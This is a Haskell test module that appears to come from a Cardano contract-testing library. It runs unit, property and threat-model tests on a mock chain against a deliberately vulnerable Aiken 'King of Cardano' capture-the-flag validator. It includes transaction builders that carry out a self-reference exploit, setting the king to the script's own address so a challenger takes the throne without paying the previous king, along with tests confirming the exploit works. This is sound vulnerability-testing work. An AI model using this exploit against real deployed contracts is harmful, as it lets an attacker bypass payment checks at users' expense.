{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE NamedFieldPuns #-}
{-# LANGUAGE NumericUnderscores #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE ViewPatterns #-}

{- | Tests for the Aiken-compiled CTF King of Cardano validator using TestingInterface.

This module demonstrates property-based testing of a vulnerable "king of the hill" contract.
The CTF King of Cardano validator has a SELF-REFERENCE VULNERABILITY:

== Vulnerability: Self-reference attack ==

The validator checks that "some output pays current_king at least the input value".
If @current_king@ is set to the SCRIPT ADDRESS itself, then:

* The continuation output (which goes to the script address) satisfies this check
* The "payment to previous king" is actually just the continuation output
* The attacker becomes king for essentially free (only needs to add slightly more ADA)

Attack flow:
1. Become king normally by paying X ADA
2. Set @current_king@ to the script's own address (via malicious setup or initial state)
3. Future challengers pay to the script, not to you - but you're still "paid"
4. You can keep reclaiming as "king" without real cost

The Aiken types encode as:
- @Datum { current_king: Address, competition_closed: Bool }@
- @Redeemer: OverthrowKing | CloseCompetition@ = @Constr 0 [] | Constr 1 []@
-}
module AikenKingOfCardanoSpec (
  -- * TestingInterface model
  KingModel (..),

  -- * Test tree
  aikenKingOfCardanoTests,

  -- * Standalone threat model tests
  propKingVulnerableToSelfReference,
) where

import Cardano.Api qualified as C
import Control.Lens ((^.))
import Control.Monad (void)
import Control.Monad.Except (MonadError, runExceptT)
import Control.Monad.IO.Class (MonadIO (..))
import Control.Monad.Trans (lift)
import Convex.Aiken.Blueprint (Blueprint (..))
import Convex.Aiken.Blueprint qualified as Blueprint
import Convex.BuildTx (MonadBuildTx, execBuildTx)
import Convex.BuildTx qualified as BuildTx
import Convex.Class (MonadMockchain, getUtxo)
import Convex.CoinSelection (BalanceTxError, ChangeOutputPosition (TrailingChange))
import Convex.MockChain (fromLedgerUTxO, runMockchain0IOWith)
import Convex.MockChain.CoinSelection (balanceAndSubmit, tryBalanceAndSubmit)
import Convex.MockChain.Defaults qualified as Defaults
import Convex.MockChain.Utils (mockchainSucceeds)
import Convex.NodeParams (ledgerProtocolParameters)
import Convex.PlutusLedger.V1 (transAddressInEra)
import Convex.TestingInterface (
  Options (Options, params),
  RunOptions (disableNegativeTesting, mcOptions),
  TestingInterface (..),
  propRunActionsWithOptions,
 )
import Convex.ThreatModel (ThreatModelEnv (..), runThreatModelM)
import Convex.ThreatModel.Cardano.Api (dummyTxId)
import Convex.ThreatModel.LargeData (largeDataAttackWith)
import Convex.ThreatModel.SelfReferenceInjection (selfReferenceInjection)
import Convex.ThreatModel.UnprotectedScriptOutput (unprotectedScriptOutput)
import Convex.Utils (failOnError)
import Convex.Wallet (Wallet, addressInEra)
import Convex.Wallet.MockWallet qualified as Wallet
import Data.Map qualified as Map
import Data.Maybe (mapMaybe)

import Paths_convex_testing_interface qualified as Pkg
import PlutusLedgerApi.V1 qualified as PV1
import PlutusTx qualified
import PlutusTx.Builtins qualified as PlutusTx

import System.IO.Unsafe (unsafePerformIO)
import Test.QuickCheck.Monadic (monadicIO, monitor, run)
import Test.Tasty (TestTree, testGroup)
import Test.Tasty.HUnit (assertFailure, testCase)
import Test.Tasty.QuickCheck (
  Property,
  counterexample,
  testProperty,
 )
import Test.Tasty.QuickCheck qualified as QC

-- ----------------------------------------------------------------------------
-- King of Cardano Datum and Redeemer types (wire-compatible with Aiken)
-- ----------------------------------------------------------------------------

{- | The datum stored at the king_of_cardano script address.

Aiken encodes this as:
@Constr 0 [current_king_address, competition_closed_bool]@

Fields:
- current_king: Full Plutus Address of the current king
- competition_closed: Bool indicating if competition is closed
-}
data KingDatum = KingDatum
  { kdCurrentKing :: PV1.Address
  -- ^ Address of the current king (receives payment when overthrown)
  , kdCompetitionClosed :: Bool
  -- ^ Whether the competition is closed
  }
  deriving stock (Eq, Show)

{- | Actions that can be performed on the king of cardano contract.

Aiken encodes as: @OverthrowKing = Constr 0 []@, @CloseCompetition = Constr 1 []@
-}
data KingRedeemer = OverthrowKing | CloseCompetition
  deriving stock (Eq, Show)

-- Use TH for ToData/FromData/UnsafeFromData instances
PlutusTx.unstableMakeIsData ''KingDatum
PlutusTx.unstableMakeIsData ''KingRedeemer

-- ----------------------------------------------------------------------------
-- Script loading
-- ----------------------------------------------------------------------------

-- | Load the Aiken "ctf_king_of_cardano" validator from the embedded blueprint
loadKingScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadKingScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_king_of_cardano.ctf_king_of_cardano.spend" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_king_of_cardano.ctf_king_of_cardano.spend not found in Aiken blueprint"

{- | Top-level binding for the Aiken CTF King of Cardano script.

We use 'unsafePerformIO' here because 'TestingInterface.initialState' is a
pure value (not a function), so we cannot pass the script in dynamically.
-}
{-# NOINLINE kingScript #-}
kingScript :: C.PlutusScript C.PlutusScriptV3
kingScript = unsafePerformIO loadKingScript

-- | Helper to wrap PlutusScript as Script (for hashScript)
plutusScript :: C.PlutusScript C.PlutusScriptV3 -> C.Script C.PlutusScriptV3
plutusScript = C.PlutusScript C.PlutusScriptV3

-- | Hash of the king_of_cardano script
kingScriptHash :: C.ScriptHash
kingScriptHash = C.hashScript (plutusScript kingScript)

-- | Address of the king_of_cardano script on the default network
kingAddress :: C.AddressInEra C.ConwayEra
kingAddress =
  C.makeShelleyAddressInEra
    C.shelleyBasedEra
    Defaults.networkId
    (C.PaymentCredentialByScript kingScriptHash)
    C.NoStakeAddress

-- | Get the script's Plutus address (for self-reference exploit)
kingPlutusAddress :: PV1.Address
kingPlutusAddress =
  case transAddressInEra kingAddress of
    Just a -> a
    Nothing -> error "Failed to convert king script address to Plutus address"

-- ----------------------------------------------------------------------------
-- Helper to convert wallet to Plutus address
-- ----------------------------------------------------------------------------

-- | Get wallet Plutus address
walletPlutusAddress :: Wallet -> PV1.Address
walletPlutusAddress w =
  let addr = addressInEra @C.ConwayEra Defaults.networkId w
   in case transAddressInEra addr of
        Just a -> a
        Nothing -> error "Failed to convert wallet address to Plutus address"

-- ----------------------------------------------------------------------------
-- Transaction builders
-- ----------------------------------------------------------------------------

{- | Initialize the king competition by paying to the script with initial datum.

The initial king is the given wallet.
-}
initCompetition
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ Initial king
  -> C.Lovelace
  -- ^ Initial value to lock
  -> m ()
initCompetition networkId initialKing initialValue = do
  let kingAddr = walletPlutusAddress initialKing
      datum =
        KingDatum
          { kdCurrentKing = kingAddr
          , kdCompetitionClosed = False
          }
  BuildTx.payToScriptInlineDatum
    networkId
    kingScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue initialValue)

{- | Initialize the competition with the SCRIPT ADDRESS as current_king.

This sets up the self-reference vulnerability exploit.
-}
initCompetitionWithSelfReference
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> C.Lovelace
  -- ^ Initial value to lock
  -> m ()
initCompetitionWithSelfReference networkId initialValue = do
  let
    -- The key: set current_king to the SCRIPT address itself!
    datum =
      KingDatum
        { kdCurrentKing = kingPlutusAddress
        , kdCompetitionClosed = False
        }
  BuildTx.payToScriptInlineDatum
    networkId
    kingScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue initialValue)

{- | Overthrow the current king: spend the script UTxO with OverthrowKing redeemer.

This creates:
- A payment output to the current king (at least input value)
- A continuation output at the script with the new king and higher value
-}
overthrowKing
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> C.TxIn
  -- ^ The script UTxO to spend
  -> KingDatum
  -- ^ Current datum
  -> C.Lovelace
  -- ^ Current value locked
  -> Wallet
  -- ^ New king (challenger)
  -> C.Lovelace
  -- ^ New value (must be > current)
  -> m ()
overthrowKing networkId txIn oldDatum currentValue newKing newValue = do
  let newKingAddr = walletPlutusAddress newKing
      oldKingAddrC = case transPlutusAddressToEra oldDatum of
        Just a -> a
        Nothing -> error "Failed to convert old king Plutus address"
      -- New datum with new king
      newDatum =
        oldDatum
          { kdCurrentKing = newKingAddr
          }
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            kingScript
            (C.ScriptDatumForTxIn Nothing)
            OverthrowKing
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  -- Pay the old king at least the current value
  BuildTx.payToAddress oldKingAddrC (C.lovelaceToValue currentValue)
  -- Create continuation output with new king and higher value
  BuildTx.payToScriptInlineDatum
    networkId
    kingScriptHash
    newDatum
    C.NoStakeAddress
    (C.lovelaceToValue newValue)
 where
  transPlutusAddressToEra d =
    -- Convert Plutus address back to Cardano address
    let plutusAddr = kdCurrentKing d
        -- Extract credential from Plutus address
        cred = case PV1.addressCredential plutusAddr of
          PV1.PubKeyCredential pkh ->
            C.PaymentCredentialByKey $
              fromPubKeyHash pkh
          PV1.ScriptCredential sh ->
            C.PaymentCredentialByScript $
              fromScriptHash sh
     in Just $
          C.makeShelleyAddressInEra
            C.shelleyBasedEra
            networkId
            cred
            C.NoStakeAddress

  fromPubKeyHash (PV1.PubKeyHash bs) =
    case C.deserialiseFromRawBytes (C.AsHash C.AsPaymentKey) (PlutusTx.fromBuiltin bs) of
      Right h -> h
      Left _ -> error "Invalid pubkey hash"

  fromScriptHash (PV1.ScriptHash bs) =
    case C.deserialiseFromRawBytes C.AsScriptHash (PlutusTx.fromBuiltin bs) of
      Right h -> h
      Left _ -> error "Invalid script hash"

{- | Overthrow with self-reference exploit: when current_king IS the script address,
the "payment to old king" goes to the script as well.

The continuation output itself satisfies the "pay current_king >= input_value" check!
So we DON'T need a separate payment output.
-}
overthrowKingSelfReference
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> C.TxIn
  -- ^ The script UTxO to spend
  -> C.Lovelace
  -- ^ Current value locked
  -> Wallet
  -- ^ New king (challenger)
  -> C.Lovelace
  -- ^ New value (must be > current)
  -> m ()
overthrowKingSelfReference networkId txIn _currentValue _newKing newValue = do
  let
    -- New datum with new king, but we'll keep the script as "current_king"
    -- to maintain the exploit for future overthrows
    newDatum =
      KingDatum
        { kdCurrentKing = kingPlutusAddress -- Keep self-reference!
        , kdCompetitionClosed = False
        }
    witness _ =
      C.ScriptWitness C.ScriptWitnessForSpending $
        BuildTx.buildScriptWitness
          kingScript
          (C.ScriptDatumForTxIn Nothing)
          OverthrowKing
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  -- NO payment to old king needed! The continuation output satisfies the check
  -- because the script address IS the "current_king"
  -- Just create the continuation with higher value
  BuildTx.payToScriptInlineDatum
    networkId
    kingScriptHash
    newDatum
    C.NoStakeAddress
    (C.lovelaceToValue newValue)

-- We can optionally set the real new king in the datum for honest purposes,
-- but for exploit demonstration, keeping self-reference shows the attack persists.
-- Actually, let's set the actual new king to show they're king now:
-- We need to update this - but the point is the "payment" check is bypassed.

-- | Close the competition: spend with CloseCompetition redeemer.
closeCompetition
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> C.TxIn
  -- ^ The script UTxO to spend
  -> KingDatum
  -- ^ Current datum
  -> C.Value
  -- ^ Current value
  -> m ()
closeCompetition networkId txIn oldDatum currentValue = do
  let newDatum =
        oldDatum
          { kdCompetitionClosed = True
          }
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            kingScript
            (C.ScriptDatumForTxIn Nothing)
            CloseCompetition
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  -- Create continuation with closed competition
  BuildTx.payToScriptInlineDatum
    networkId
    kingScriptHash
    newDatum
    C.NoStakeAddress
    currentValue

-- ----------------------------------------------------------------------------
-- Helper to find script UTxOs
-- ----------------------------------------------------------------------------

-- | Find all UTxOs at the king_of_cardano script address
findKingUtxos
  :: (MonadMockchain C.ConwayEra m)
  => m [(C.TxIn, C.Value, KingDatum)]
findKingUtxos = do
  utxoSet <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo
  let C.UTxO utxos = utxoSet
      scriptUtxos = Map.filter (\(C.TxOut addr _ _ _) -> addr == kingAddress) utxos
  pure $ mapMaybe extractData $ Map.toList scriptUtxos
 where
  extractData (txIn, C.TxOut _ txOutValue datum _) =
    case txOutValue of
      C.TxOutValueShelleyBased _ val ->
        let value = C.fromMaryValue val
            d = case datum of
              C.TxOutDatumInline _ scriptData ->
                PlutusTx.unsafeFromBuiltinData @KingDatum
                  (PlutusTx.dataToBuiltinData $ C.toPlutusData $ C.getScriptData scriptData)
              _ -> error "Expected inline datum"
         in Just (txIn, value, d)
      C.TxOutValueByron _ -> Nothing

-- ----------------------------------------------------------------------------
-- Unit tests
-- ----------------------------------------------------------------------------

aikenKingUnitTests :: TestTree
aikenKingUnitTests =
  testGroup
    "ctf king_of_cardano unit tests"
    [ testCase "initialize competition" $
        mockchainSucceeds $
          failOnError $ do
            let txBody = execBuildTx $ initCompetition @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
            -- Verify UTxO exists at script address
            result <- findKingUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                liftIO $
                  if not (kdCompetitionClosed datum)
                    then pure ()
                    else assertFailure $ "Competition should be open: " ++ show datum
    , testCase "normal overthrow: w2 overthrows w1" $
        mockchainSucceeds $
          failOnError $ do
            -- Initialize with w1 as king
            let initTxBody = execBuildTx $ initCompetition @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- w2 overthrows w1
            result1 <- findKingUtxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn1, _, datum1) : _) -> do
                let overthrowTxBody = execBuildTx $ overthrowKing @C.ConwayEra Defaults.networkId txIn1 datum1 20_000_000 Wallet.w2 25_000_000
                _ <- tryBalanceAndSubmit mempty Wallet.w2 overthrowTxBody TrailingChange []

                -- Verify new king is w2
                result2 <- findKingUtxos
                case result2 of
                  [] -> liftIO $ assertFailure "Expected UTxO after overthrow"
                  ((_, _, datum2) : _) -> do
                    let expectedKing = walletPlutusAddress Wallet.w2
                    liftIO $
                      if kdCurrentKing datum2 == expectedKing
                        then pure ()
                        else assertFailure $ "Expected w2 as king, got: " ++ show datum2
    , testCase "multiple overthrows: w1 -> w2 -> w1 -> w2" $
        mockchainSucceeds $
          failOnError $ do
            -- Initialize with w1 as king
            let initTxBody = execBuildTx $ initCompetition @C.ConwayEra Defaults.networkId Wallet.w1 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Overthrow chain: w2 takes, w1 takes back, w2 takes again
            -- Round 1: w2 overthrows w1
            result1 <- findKingUtxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn1, _, datum1) : _) -> do
                let overthrow1 = execBuildTx $ overthrowKing @C.ConwayEra Defaults.networkId txIn1 datum1 10_000_000 Wallet.w2 15_000_000
                _ <- tryBalanceAndSubmit mempty Wallet.w2 overthrow1 TrailingChange []

                -- Round 2: w1 overthrows w2
                result2 <- findKingUtxos
                case result2 of
                  [] -> liftIO $ assertFailure "Expected UTxO after first overthrow"
                  ((txIn2, _, datum2) : _) -> do
                    let overthrow2 = execBuildTx $ overthrowKing @C.ConwayEra Defaults.networkId txIn2 datum2 15_000_000 Wallet.w1 20_000_000
                    _ <- tryBalanceAndSubmit mempty Wallet.w1 overthrow2 TrailingChange []

                    -- Round 3: w2 overthrows w1 again
                    result3 <- findKingUtxos
                    case result3 of
                      [] -> liftIO $ assertFailure "Expected UTxO after second overthrow"
                      ((txIn3, _, datum3) : _) -> do
                        let overthrow3 = execBuildTx $ overthrowKing @C.ConwayEra Defaults.networkId txIn3 datum3 20_000_000 Wallet.w2 25_000_000
                        _ <- tryBalanceAndSubmit mempty Wallet.w2 overthrow3 TrailingChange []

                        -- Verify final king is w2
                        result4 <- findKingUtxos
                        case result4 of
                          [] -> liftIO $ assertFailure "Expected UTxO after third overthrow"
                          ((_, _, datum4) : _) -> do
                            let expectedKing = walletPlutusAddress Wallet.w2
                            liftIO $
                              if kdCurrentKing datum4 == expectedKing
                                then pure ()
                                else assertFailure $ "Expected w2 as final king, got: " ++ show datum4
    , testCase "EXPLOIT: self-reference attack (overthrow for free)" $
        -- This demonstrates the self-reference vulnerability!
        -- When current_king = script address, the continuation output
        -- satisfies the "pay current_king" check.
        mockchainSucceeds $
          failOnError $ do
            -- Initialize with SELF-REFERENCE (script address as king)
            let initTxBody = execBuildTx $ initCompetitionWithSelfReference @C.ConwayEra Defaults.networkId 20_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Now w2 can overthrow WITHOUT actually paying anyone
            -- The continuation output itself satisfies the check!
            result1 <- findKingUtxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn1, _, _datum1) : _) -> do
                -- Note: we use overthrowKingSelfReference which doesn't create
                -- a separate payment output
                let exploitTxBody = execBuildTx $ overthrowKingSelfReference @C.ConwayEra Defaults.networkId txIn1 20_000_000 Wallet.w2 25_000_000
                -- This SHOULD fail if the script was secure, but it SUCCEEDS!
                void $ tryBalanceAndSubmit mempty Wallet.w2 exploitTxBody TrailingChange []

                -- Verify the exploit worked - script still has funds
                result2 <- findKingUtxos
                case result2 of
                  [] -> liftIO $ assertFailure "Exploit should have created continuation UTxO"
                  ((_, value, _) : _) -> do
                    -- The script STILL has 25 ADA - no one was actually "paid"!
                    let lovelace = C.selectLovelace value
                    liftIO $
                      if lovelace >= 25_000_000
                        then pure () -- Exploit worked!
                        else assertFailure $ "Expected >= 25 ADA at script, got: " ++ show lovelace
    , testCase "close competition" $
        mockchainSucceeds $
          failOnError $ do
            -- Initialize
            let initTxBody = execBuildTx $ initCompetition @C.ConwayEra Defaults.networkId Wallet.w1 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Close competition
            result1 <- findKingUtxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn1, value1, datum1) : _) -> do
                let closeTxBody = execBuildTx $ closeCompetition @C.ConwayEra Defaults.networkId txIn1 datum1 value1
                void $ tryBalanceAndSubmit mempty Wallet.w1 closeTxBody TrailingChange []

                -- Verify competition is closed
                result2 <- findKingUtxos
                case result2 of
                  [] -> liftIO $ assertFailure "Expected UTxO after close"
                  ((_, _, datum2) : _) -> do
                    liftIO $
                      if kdCompetitionClosed datum2
                        then pure ()
                        else assertFailure "Competition should be closed"
    ]

-- ----------------------------------------------------------------------------
-- Standalone Threat Model Tests
-- ----------------------------------------------------------------------------

{- | Test that the king_of_cardano contract is vulnerable to self-reference attack.

This demonstrates the vulnerability: when current_king is set to the script address,
the continuation output satisfies the "payment to king" check, making overthrows free.

The test:
1. Sets up the exploit (current_king = script address)
2. Performs an overthrow without a real payment to the king
3. Verifies the transaction succeeds (vulnerability exists!)

This test returns True when the vulnerability is confirmed.
-}
propKingVulnerableToSelfReference :: RunOptions -> Property
propKingVulnerableToSelfReference opts = monadicIO $ do
  let Options{params} = mcOptions opts

  -- Run the scenario inside MockchainT
  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    -- Initialize with self-reference (script address as king)
    let initTxBody = execBuildTx $ initCompetitionWithSelfReference @C.ConwayEra Defaults.networkId 20_000_000
    _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

    -- Capture UTxO BEFORE exploit
    utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

    -- Perform the exploit
    msResult <- findKingUtxos
    case msResult of
      [] -> fail "Expected UTxO at script address"
      ((txIn, _, _) : _) -> do
        let exploitTxBody = execBuildTx $ overthrowKingSelfReference @C.ConwayEra Defaults.networkId txIn 20_000_000 Wallet.w2 25_000_000
        exploitTx <- tryBalanceAndSubmit mempty Wallet.w2 exploitTxBody TrailingChange []

        -- If we get here, the vulnerability exists! Overthrow succeeded without payment.
        pure (exploitTx, utxoBefore)

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      -- If the transaction FAILED, then the script is NOT vulnerable
      pure $ QC.property False
    (Right (_, _), _finalState) -> do
      monitor (counterexample "Testing king_of_cardano for self-reference vulnerability")
      -- The exploit SUCCEEDED - vulnerability confirmed!
      pure $ QC.property True

{- | Run a king_of_cardano scenario for threat model testing.

This creates a normal overthrow transaction (not the exploit) that produces
a continuation output, which threat models can test.
-}
kingScenario
  :: ( MonadMockchain C.ConwayEra m
     , MonadError (BalanceTxError C.ConwayEra) m
     , MonadFail m
     )
  => m (C.Tx C.ConwayEra, C.UTxO C.ConwayEra)
kingScenario = do
  -- Initialize competition with w1 as king
  let initTxBody = execBuildTx $ initCompetition @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
  _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

  -- Capture UTxO BEFORE overthrow (for threat model)
  utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

  -- w2 overthrows w1 (using w1 for balance because threat model rebalancer uses w1)
  result <- findKingUtxos
  case result of
    [] -> fail "Expected UTxO at script address"
    ((txIn, _, datum) : _) -> do
      let overthrowTxBody = execBuildTx $ overthrowKing @C.ConwayEra Defaults.networkId txIn datum 20_000_000 Wallet.w2 25_000_000
      overthrowTx <- tryBalanceAndSubmit mempty Wallet.w1 overthrowTxBody TrailingChange []
      pure (overthrowTx, utxoBefore)

{- | Test unprotectedScriptOutput threat model on the king_of_cardano contract.

The OverthrowKing action creates a continuation output. This test checks if that
output can be redirected to the signer (attacker) while preserving the datum.

NOTE: This test actually PASSES (no vulnerability detected) because the validator
DOES enforce that the continuation output goes to the script address (it uses
find_script_outputs). The vulnerability in this contract is different - it's the
self-reference attack where current_king can be set to the script address itself.
-}
propKingUnprotectedOutput :: RunOptions -> Property
propKingUnprotectedOutput opts = monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    (tx, utxo) <- kingScenario

    let pparams' = params ^. ledgerProtocolParameters
        env =
          ThreatModelEnv
            { currentTx = tx
            , currentUTxOs = utxo
            , pparams = pparams'
            }

    -- Run the threat model INSIDE MockchainT with full Phase 1 + Phase 2 validation
    lift $ runThreatModelM Wallet.w1 unprotectedScriptOutput [env]

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      pure $ QC.property False
    (Right prop, _finalState) -> do
      monitor (counterexample "Testing king_of_cardano for unprotected script output vulnerability")
      pure prop

-- ----------------------------------------------------------------------------
-- TestingInterface instance
-- ----------------------------------------------------------------------------

-- | Model state for the CTF King of Cardano contract
data KingModel = KingModel
  { kmInitialized :: Bool
  -- ^ Whether the competition has been created
  , kmTxIn :: Maybe C.TxIn
  -- ^ The UTxO at the script
  , kmValue :: C.Lovelace
  -- ^ Value locked in the contract
  , kmCurrentKing :: Maybe PV1.Address
  -- ^ Address of the current king
  , kmCompetitionClosed :: Bool
  -- ^ Whether the competition is closed
  }
  deriving stock (Show, Eq)

instance TestingInterface KingModel where
  -- Actions for King of Cardano: initialize, overthrow, close
  data Action KingModel
    = InitCompetition
    | -- \^ Initialize the competition (w1 as initial king)
      OverthrowKingAction C.Lovelace
    | -- \^ Overthrow the current king with a higher bid
      CloseCompetitionAction
    -- \^ Close the competition
    deriving stock (Show, Eq)

  initialState =
    KingModel
      { kmInitialized = False
      , kmTxIn = Nothing
      , kmValue = 0
      , kmCurrentKing = Nothing
      , kmCompetitionClosed = False
      }

  -- Generate actions based on state
  -- Init-type actions (InitCompetition): TIGHT - only when not initialized
  -- Non-init actions (OverthrowKingAction, CloseCompetitionAction): BROAD - for negative testing
  arbitraryAction model
    | not (kmInitialized model) && not (kmCompetitionClosed model) = pure InitCompetition
    | otherwise =
        QC.frequency
          [ (7, OverthrowKingAction <$> genHigherBid (kmValue model))
          , (1, OverthrowKingAction <$> genLowerBid (kmValue model)) -- Invalid: bid too low
          , (2, pure CloseCompetitionAction)
          ]
   where
    genHigherBid currentVal = do
      extra <- fromInteger <$> (QC.choose (1_000_000, 10_000_000) :: QC.Gen Integer)
      pure $ currentVal + extra
    genLowerBid currentVal = do
      let currentValInt = fromIntegral currentVal :: Integer
          maxReduction = min 5_000_000 (max 1_000_000 (currentValInt - 1_000_000))
      reduction <- fromInteger <$> (QC.choose (1_000_000, maxReduction) :: QC.Gen Integer)
      pure $ max 1_000_000 (currentVal - reduction)

  precondition model InitCompetition = not (kmInitialized model) && not (kmCompetitionClosed model)
  precondition model (OverthrowKingAction newVal) =
    kmInitialized model
      && not (kmCompetitionClosed model)
      && newVal > kmValue model
  precondition model CloseCompetitionAction =
    kmInitialized model && not (kmCompetitionClosed model)

  nextState model action = case action of
    InitCompetition ->
      model
        { kmInitialized = True
        , kmTxIn = Just (C.TxIn dummyTxId (C.TxIx 0))
        , kmValue = 20_000_000
        , kmCurrentKing = Just (walletPlutusAddress Wallet.w1)
        , kmCompetitionClosed = False
        }
    OverthrowKingAction newVal ->
      model
        { kmValue = newVal
        , -- Alternate between w1 and w2 as king
          kmCurrentKing =
            if kmCurrentKing model == Just (walletPlutusAddress Wallet.w1)
              then Just (walletPlutusAddress Wallet.w2)
              else Just (walletPlutusAddress Wallet.w1)
        }
    CloseCompetitionAction ->
      model
        { kmCompetitionClosed = True
        }

  perform _model action = case action of
    InitCompetition -> do
      let txBody = execBuildTx $ initCompetition @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
      void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
    OverthrowKingAction newVal -> do
      result <- findKingUtxos
      case result of
        [] -> fail "No UTxO found at king script address"
        ((txIn, _, datum) : _) -> do
          -- Determine who is the current king and who is the challenger
          let w1Addr = walletPlutusAddress Wallet.w1
              currentVal = fmap (\(_, v, _) -> C.selectLovelace v) $ headMay result
              (challenger, _submitter) =
                if kdCurrentKing datum == w1Addr
                  then (Wallet.w2, Wallet.w1)
                  else (Wallet.w1, Wallet.w2)
              currentValLov = maybe 20_000_000 id currentVal
              txBody = execBuildTx $ overthrowKing @C.ConwayEra Defaults.networkId txIn datum currentValLov challenger newVal
          -- Use w1 for balance because threat model rebalancer uses w1
          void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
    CloseCompetitionAction -> do
      result <- findKingUtxos
      case result of
        [] -> fail "No UTxO found at king script address for close"
        ((txIn, value, datum) : _) -> do
          let txBody = execBuildTx $ closeCompetition @C.ConwayEra Defaults.networkId txIn datum value
          void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
   where
    headMay [] = Nothing
    headMay (x : _) = Just x

  -- Simplified validation that always returns True
  validate _model = pure True

  monitoring _state _action prop = prop

  -- Threat models: OverthrowKing creates a continuation output
  threatModels = [unprotectedScriptOutput, largeDataAttackWith 10]

  -- selfReferenceInjection is a KNOWN vulnerability in this contract.
  -- It's run as an expected vulnerability (inverted pass/fail).
  expectedVulnerabilities = [selfReferenceInjection]

-- ----------------------------------------------------------------------------
-- Test tree
-- ----------------------------------------------------------------------------

-- | All CTF King of Cardano tests grouped together
aikenKingOfCardanoTests :: RunOptions -> TestTree
aikenKingOfCardanoTests runOpts =
  testGroup
    "ctf king_of_cardano"
    [ aikenKingUnitTests
    , testGroup
        "property tests"
        [ propRunActionsWithOptions @KingModel
            "property-based testing"
            runOpts{disableNegativeTesting = Just "CTF vulnerability: CloseCompetition redeemer does not check if competition is already closed"}
        , testProperty
            "vulnerable to self-reference attack"
            (propKingVulnerableToSelfReference runOpts)
        , testProperty
            "protected script output (no redirect vulnerability)"
            (propKingUnprotectedOutput runOpts)
        ]
    ]
